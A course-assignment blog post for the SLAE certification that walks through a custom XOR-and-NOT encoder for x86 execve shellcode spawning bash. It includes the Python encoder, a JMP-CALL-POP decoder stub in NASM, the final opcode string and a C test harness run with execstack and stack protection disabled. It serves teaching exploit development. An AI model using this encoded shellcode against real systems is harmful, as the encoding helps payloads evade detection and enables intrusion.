# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-1523

## Assignment#4: What to do ?
For this assignment we have to:
* Create a custom encoding scheme 

Note:
* All the commands used for this assignment were done on the last 64 bits version of KALI Linux.

Now, let's get to work.
=
## 1) The encryption routine:

To do this task, I have chosen to use a two step encoding schema. The python code, used for this task, will go through the shellcode provided inside the 'shellcode' variable and then apply its encoder routine on each Byte.

As said before, the shellcode will be encoded in two steps:
1) Each Byte will be XOR with the 0xAA Byte,
2) Then a NOT operation will be done

Below is the python code used to encode the shellcode:
```python
#!/usr/bin/python3
# Python XOR and NOT encoder

# The shellcode used is a basic systemcall to execve
shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
encoded_shellcode = ""

print('Shellcode len: {}'.format(len(shellcode)))
print('Encoded shellcode ...')

# Each Bytes of the shellcode will be encoded two times using a XOR then a NOT encoder
for x in bytearray(shellcode):
	# XOR encoder:
	# 0xAA is the Byte used to encode
	y = x ^ 0xAA

	# NOT encoder:
	y = ~y
	encoded_shellcode += '{},'.format(hex(y & 0xFF))

# Print the encoded shellcode
print(encoded_shellcode)
```
Here is the results from the python encoder:
```console
kali@kali:/tmp$ python3 encoder.py 
Shellcode len: 30
Encoded shellcode ...
0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5,
```

## 2) The decryption routine:

The 'decoder.nasm' file use the famous JUMP-CALL-POP technique to avoid NULL BYTES.

We can divide this decryption routine in four steps:
1) The JUMP PART of the assembly code will first initialize ecx to NULL then move the length of the shellcode inside cl. It will finally jump inside the CALL section.
```nasm
;JUMP PART
_start:
    xor ecx, ecx                    ;Initialize ecx to NULL
    mov cl, shellcodeLen            ;Initialize cl to the shellcode length
    jmp stage1                      ;Jump to the CALL part (stage1)
```

2) The CALL PART will call the 'stage2' of the code by jumping to it and push the 'shellcode' variable on the stack
```nasm
;CALL PART
stage1:
    call stage2                     ;Call the second part (stage2)
    ;The encoded shellcode is stored here
    shellcode: db 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
    shellcodeLen: equ $-shellcode   ;This lign is used to get the shellcode length
```

3) The POP PART will simply pop the 'shellcode' variable inside esi and let the execution continues. The decoding process start by using the NOT and XOR logical operations on each Byte of the shellcode.
```nasm
;DECRYPTION PART
stage3:
    not BYTE [esi]                  ;Start the decryption process by a NOT on the value pointed by esi
    xor BYTE [esi], 0xAA            ;Then XOR the value pointed by esi with 0xAA
    inc esi                         ;Increment the address stores inside esi
    loop stage3                     ;Loop until the cl == 0, which means the shellcode is decoded
```

4) Finally, we jump in and execute the decoded shellcode 
```nasm
jmp shellcode                   ;Jump to the decoded shellcode and execute it
```

Below is the whole assembly code described above:
```nasm
;A simple NOT and XOR decoder using the JUMP-CALL-POP method

global _start

;JUMP PART
_start:
    xor ecx, ecx                    ;Initialize ecx to NULL
    mov cl, shellcodeLen            ;Initialize cl to the shellcode length
    jmp stage1                      ;Jump to the CALL part (stage1)

;POP PART
stage2:
    pop esi                         ;Pop the shellcode inside esi

;DECRYPTION PART
stage3:
    not BYTE [esi]                  ;Start the decryption process by a NOT on the value pointed by esi
    xor BYTE [esi], 0xAA            ;Then XOR the value pointed by esi with 0xAA
    inc esi                         ;Increment the address stores inside esi
    loop stage3                     ;Loop until the cl == 0, which means the shellcode is decoded

    jmp shellcode                   ;Jump to the decoded shellcode and execute it

;CALL PART
stage1:
    call stage2                     ;Call the second part (stage2)
    ;The encoded shellcode is stored here
    shellcode: db 0x64,0x8e,0x6,0x3d,0x37,0x34,0x26,0x3d,0x3d,0x37,0x3c,0x3b,0x7a,0x3d,0x7a,0x7a,0x7a,0x7a,0xdc,0xb6,0x64,0x9c,0x64,0x87,0x64,0x95,0xe5,0x5e,0x98,0xd5
    shellcodeLen: equ $-shellcode   ;This lign is used to get the shellcode length
```

Let's compile and get the hexadecimal representation from it:
```console
kali@kali:/$ nasm -f elf32 -o decoder.o decoder.nasm
kali@kali:/$ ld -m elf_i386 -z execstack -o decoder decoder.o
kali@kali:/$ objdump -d ./decoder |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5"
```

We can now add the newly generated shellcode to the following C code:
```c
#include <stdio.h>
#include <string.h>

// The shellcode is stored here
unsigned char shellcode[] = \
"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5";

int main()
{
	// Print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Convert shellcode to a function
	int (*ret)() = (int(*)())shellcode;

	// Execute the shellcode
	ret();
}
```

let's compile and execute it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ ./test_shellcode
Shellcode Length:  52

kali@kali:/tmp/Shellcode/SLAE/assignment4$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
kali@kali:/tmp/Shellcode/SLAE/assignment4$ whoami
kali
kali@kali:/tmp/Shellcode/SLAE/assignment4$ exit
exit

kali@kali:/tmp$
```

